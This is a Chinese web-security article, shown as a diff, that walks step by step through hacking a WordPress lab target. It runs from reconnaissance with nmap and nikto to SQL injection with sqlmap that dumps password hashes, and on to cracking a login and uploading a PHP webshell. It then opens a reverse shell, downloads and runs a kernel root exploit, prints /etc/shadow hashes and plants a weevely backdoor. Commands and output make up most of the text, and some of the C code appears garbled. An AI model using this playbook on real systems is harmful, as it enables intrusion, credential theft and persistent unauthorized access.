@@ -1,0 +1,408 @@
+﻿黑客是怎样入侵你的网站的
+Flamingo @ WEB安全 2013-02-19 共 40406 人围观，发现 32 个不明物体收藏该文
+感谢Flamingo投递
+这个问题很难回答，简单的来说，入侵一个网站可以有很多种方法。本文的目的是展示黑客们常用的扫描和入侵网站的技术。
+假设你的站点是：hack-test.com
+
+让我们来ping一下这个服务器：
+
+我们得到了一个IP地址：173.236.138.113 – 这是我们目标服务器的IP地址。
+Sameip.org 可以帮助我们找到其他与这个服务器绑定的域名：
+
+Same IP
+26 sites hosted on IP Address 173.236.138.113
+有26个站点在这台服务器上（173.236.138.113）。许多黑客会选择攻击在同服务器上的不同站点从而入侵到你的网站。但是出于为了学习目的，我们只选择入侵你的服务器。
+我们需要从你的站点得到一下信息：
+1.DNS记录（A,NS,TXT,MX 和SOA）
+2.网站服务器的类型（Apache,IIS,Tomcat）
+3.域名的注册信息（哪个公司拥有这个域名）
+4.你的名字，地址，EMAIL和电话
+5.你的网站上所运行的脚本类型（PHP,ASP,ASP.NET,JSP,CFM）
+6.服务器的操作系统类型（Unix,Linux,Windows,Solaris）
+7.服务器对外开放的端口（80,443,21,等）
+现在让我们来寻找网站的DNS记录。选择网站“Who.is”来实现这个目标。
+
+我们发现站点上的DNS记录有：
+
+
+让我们来检测一下网站服务器的类型：
+
+我们可以看到，网站服务器用的是Apache. 稍后我们会检测Apache的版本。
+HACK-TEST.COM SITE INFORMATION
+IP: 173.236.138.113
+Website Status: active
+Server Type: Apache
+Alexa Trend/Rank:   1 Month: 3,213,968 3 Month: 2,161,753
+Page Views per Visit:   1 Month: 2.0 3 Month: 3.7
+接下来我们来寻找一下域名的注册信息：
+
+我们得到了注册者以及其他重要的信息。我们可以用Whatweb来检测你的站点使用的是什么脚本语言以及操作系统类型和网站服务器的版本。
+
+
+我们可以看到，网站使用的是WordPress，操作系统类型是Fedora Linux，网站服务器版本是Apache 2.2.15，下面我们来检测一下服务器上打开的端口：
+我们使用Nmap：
+1.检测服务器上运行着哪些服务：
+root@bt:/# nmap -sV hack-test.com
+
+Starting Nmap 5.59BETA1 ( http://nmap.org ) at 2011-12-28 06:39 EET
+Nmap scan report for hack-test.com (192.168.1.2)
+Host is up (0.0013s latency).
+Not shown: 998 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp closed ssh
+80/tcp open http Apache httpd 2.2.15 ((Fedora))
+MAC Address: 00:0C:29:01:8A:4D (VMware)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+
+Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
+2.检测服务器的OS
+root@bt:/# nmap -O hack-test.com
+
+Starting Nmap 5.59BETA1 ( http://nmap.org ) at 2011-12-28 06:40 EET
+Nmap scan report for hack-test.com (192.168.1.2)
+Host is up (0.00079s latency).
+Not shown: 998 filtered ports
+PORT STATE SERVICE
+22/tcp closed ssh
+
+80/tcp open http
+MAC Address: 00:0C:29:01:8A:4D (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS details: Linux 2.6.22 (Fedora Core 6)
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+
+Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
+服务器只开放了80端口，操作系统是Linux 2.6.22(Fedora Core 6)
+现在我们已经得到了所有重要的信息，接下来我们来做一下弱点测试，例如：sql注入，盲注，LFI,RFI,XSS,CSRF，等。
+我们用Nikto.pl 来获取信息以及弱点：
+root@bt:/pentest/web/nikto# perl nikto.pl -h http://hack-test.com
+
+- Nikto v2.1.4
+
+---------------------------------------------------------------------------
+
++ Target IP: 192.168.1.2
++ Target Hostname: hack-test.com
++ Target Port: 80
++ Start Time: 2011-12-29 06:50:03
+
+---------------------------------------------------------------------------
+
++ Server: Apache/2.2.15 (Fedora)
++ ETag header found on server, inode: 12748, size: 1475, mtime: 0x4996d177f5c3b
++ Apache/2.2.15 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6448 items checked: 1 error(s) and 6 item(s) reported on remote host
++ End Time: 2011-12-29 06:50:37 (34 seconds)
+
+---------------------------------------------------------------------------
+
++ 1 host(s) tested
+
+也可以使用W3AF,这个工具可以在Backtrack 5 R1中找到
+root@bt:/pentest/web/w3af# ./w3af_gui
+
+Starting w3af, running on:
+Python version:
+2.6.5 (r265:79063, Apr 16 2010, 13:57:41)
+[GCC 4.4.3]
+GTK version: 2.20.1
+PyGTK version: 2.17.0
+
+w3af - Web Application Attack and Audit Framework
+Version: 1.2
+Revision: 4605
+Author: Andres Riancho and the w3af team.
+
+我们可以插入URL，选择full audit选项：
+
+稍等片刻，结果就会出现。
+
+网站存在着sql注入漏洞以及其他的漏洞。
+让我们来深入一下sql注入：
+
+http://hack-test.com/Hackademic_RTB1/?cat=d%27z%220
+这个地址就是注入点，
+
+我们用sqlmap然后dump所有入侵所需要用到的数据库信息
+sqlmap –u url
+
+稍等片刻：
+
+选择“n”继续：
+
+网站的sql注入类型是error-based Mysql数据库的版本是5.
+加上参数“-dbs”可以找出所有的数据库：
+
+我们发现了3个数据库:
+
+用dump –Dwordpress -tables导出wordpress数据库表
+
+
+我们需要导出“wp_users”表来得到用户信息以及密码的hash，之后我们就可以尝试着去破解密码最终登陆到wordpress的后台。
+使用参数 “-T wp_users –columns “
+
+找到了22列的数据：
+
+使用参数 -C user_login,user_pass –dump 来导出列。
+之后我们就得到了账号密码。
+
+接来使用这个网站来把MD5转换成明文密码（并不是所有HASH都能成功转换）
+“http://www.onlinehashcrack.com/free-hash-reverse.php“
+
+明文密码是： q1w2e3
+用户名 “GeorgeMiller”
+让我们来登陆wordpress的后台：
+
+
+
+现在我们来试着上传一个php webshell 用来在这台服务器上执行一些linux命令
+编辑wordpress的“Textile”插件
+编辑它
+
+插入一个php webshell来代替一个真正的插件。之后点击上传，php webshell就被成功上传到服务器上了。
+
+现在，PHP WEBSHELL就成功运行了。现在就可以浏览网站里所有的文件了，但是我们想得到服务器的root权限然后入侵其他的站点。
+选择 在php webshell 里的“back-connect “然后连接到我们的ip “192.168.1.6″ 端口 “5555″
+
+在我们点击连接之前，我们先得在本机上监听一个“5555”的端口
+
+点击连接，我们会得到这样一个窗口：
+
+我们来试一下linux的命令
+id
+uid=48(apache) gid=489(apache) groups=489(apache)
+pwd
+/var/www/html/Hackademic_RTB1/wp-content/plugins
+uname -a
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+
+ID命令用来告诉我们用户ID和用户组
+Pwd命令能告诉我们现在所在的路径
+uname –a 命令用来得到一些信息以及内核版本
+好了，我们现在知道服务器的内核版本是2.6.31.5-127.fc12.1686
+Ok, now we knew that server kernel version is 2.6.31.5-127.fc12.1686
+我们可以在 exploit-db.com 找到针对这个版本的exploit
+输入： “kernel 2.6.31 “
+
+以上结果没有合适的，因为他们都不是用来提权的。下一个，就是它了！
+
+http://www.exploit-db.com/exploits/15285
+复制这个连接
+http://www.exploit-db.com/download/15285
+在netcat shell里输入：
+wget http://www.exploit-db.com/download/15285 -O roro.c
+--2011-12-28 00:48:01-- http://www.exploit-db.com/download/15285
+Resolving www.exploit-db.com... 199.27.135.111, 199.27.134.111
+Connecting to www.exploit-db.com|199.27.135.111|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: http://www.exploit-db.com/download/15285/ [following]
+--2011-12-28 00:48:02-- http://www.exploit-db.com/download/15285/
+Connecting to www.exploit-db.com|199.27.135.111|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7154 (7.0K) [application/txt]
+Saving to: `roro.c'
+
+0K ...... 100% 29.7K=0.2s
+
+我们用wget命令来获取exploit-db.com的exploit，-O是重命名文件为：roro.c
+Note: 
+Linux内核的exploits大多数都是用c语言开发的所以我们保存后缀名为.c ,直接浏览源文件就可以直接看见源码：
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/utsname.h>
+
+#define RECVPORT 5555
+#define SENDPORT 6666
+
+intprep_sock(intport)
+{
+
+ints, ret;
+structsockaddr_in addr;
+
+s = socket(PF_RDS, SOCK_SEQPACKET, 0);
+
+if(s < 0) {
+printf(“[*] Could not open socket.\n”);
+exit(-1);
+}
+
+memset(&addr, 0, sizeof(addr));
+
+All the above lines indicate that this is exploit is written in C language
+After we saved our exploit on server, we will compile it to elf format by typing
+我们保存exploit在服务器上之后，我们可以编译它：
+gcc roro.c –o roro
+然后执行exploit：
+./roro
+
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+[+] Resolved rds_proto_ops to 0xe09f0b20
+[+] Resolved rds_ioctl to 0xe09db06a
+[+] Resolved commit_creds to 0xc044e5f1
+[+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting function pointer...
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+[+] Resolved rds_proto_ops to 0xe09f0b20
+[+] Resolved rds_ioctl to 0xe09db06a
+[+] Resolved commit_creds to 0xc044e5f1
+[+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+Id
+这时候我们已经是root权限了。
+uid=0(root) gid=0(root)
+
+我们可以浏览 /etc/shadow file
+cat /etc/shadow
+
+root:$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
+bin:*:14495:0:99999:7:::
+daemon:*:14495:0:99999:7:::
+adm:*:14495:0:99999:7:::
+lp:*:14495:0:99999:7:::
+sync:*:14495:0:99999:7:::
+shutdown:*:14495:0:99999:7:::
+halt:*:14495:0:99999:7:::
+mail:*:14495:0:99999:7:::
+uucp:*:14495:0:99999:7:::
+operator:*:14495:0:99999:7:::
+games:*:14495:0:99999:7:::
+gopher:*:14495:0:99999:7:::
+ftp:*:14495:0:99999:7:::
+nobody:*:14495:0:99999:7:::
+vcsa:!!:14557::::::
+avahi-autoipd:!!:14557::::::
+ntp:!!:14557::::::
+dbus:!!:14557::::::
+rtkit:!!:14557::::::
+nscd:!!:14557::::::
+tcpdump:!!:14557::::::
+avahi:!!:14557::::::
+haldaemon:!!:14557::::::
+openvpn:!!:14557::::::
+apache:!!:14557::::::
+saslauth:!!:14557::::::
+mailnull:!!:14557::::::
+smmsp:!!:14557::::::
+smolt:!!:14557::::::
+sshd:!!:14557::::::
+pulse:!!:14557::::::
+gdm:!!:14557::::::
+p0wnbox.Team:$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76/:14981:0:99999:7:::
+mysql:!!:14981::::::
+浏览 /etc/passwd file
+cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
+avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
+nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
+haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
+openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
+apache:x:48:489:Apache:/var/www:/sbin/nologin
+saslauth:x:495:488:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
+mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
+smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
+sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+gdm:x:42:481::/var/lib/gdm:/sbin/nologin
+p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
+mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash
+我们可以用“john the ripper”来破解用户的密码，但我们不会这么做。
+黑客需要留一个后门在服务器上，方便以后访问。
+这里，我们使用weevely来生成一个小型有密码的php后门，然后上传到服务器上来达到目的。
+weevely 用法 :
+root@bt:/pentest/backdoors/web/weevely# ./main.py -
+
+Weevely 0.3 - Generate and manage stealth PHP backdoors.
+Copyright (c) 2011-2012 Weevely Developers
+Website: http://code.google.com/p/weevely/
+
+Usage: main.py [options]
+
+Options:
+-h, --help show this help message and exit
+-g, --generate Generate backdoor crypted code, requires -o and -p .
+-o OUTPUT, --output=OUTPUT
+Output filename for generated backdoor .
+-c COMMAND, --command=COMMAND
+Execute a single command and exit, requires -u and -p
+.
+-t, --terminal Start a terminal-like session, requires -u and -p .
+-C CLUSTER, --cluster=CLUSTER
+Start in cluster mode reading items from the give
+file, in the form 'label,url,password' where label is
+optional.
+-p PASSWORD, --password=PASSWORD
+Password of the encrypted backdoor .
+
+-u URL, --url=URL Remote backdoor URL .
+创建一个带密码的php后门
+root@bt:/pentest/backdoors/web/weevely# ./main.py -g -o hax.php -p koko
+
+Weevely 0.3 - Generate and manage stealth PHP backdoors.
+Copyright (c) 2011-2012 Weevely Developers
+Website: http://code.google.com/p/weevely/
+
++ Backdoor file 'hax.php' created with password 'koko'.
+
+通过php webshell上传一个php后门
+
+
+上传完毕之后我们使用一下命令来连接：
+root@bt:/pentest/backdoors/web/weevely# ./main.py -t -u http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php -p koko
+
+Weevely 0.3 - Generate and manage stealth PHP backdoors.
+Copyright (c) 2011-2012 Weevely Developers
+Website: http://code.google.com/p/weevely/
+
++ Using method 'system()'.
++ Retrieving terminal basic environment variables .
+
+[apache@HackademicRTB1 /var/www/html/Hackademic_RTB1/wp-content/plugins]
+
+测试我们的 hax.php 后门
+
+
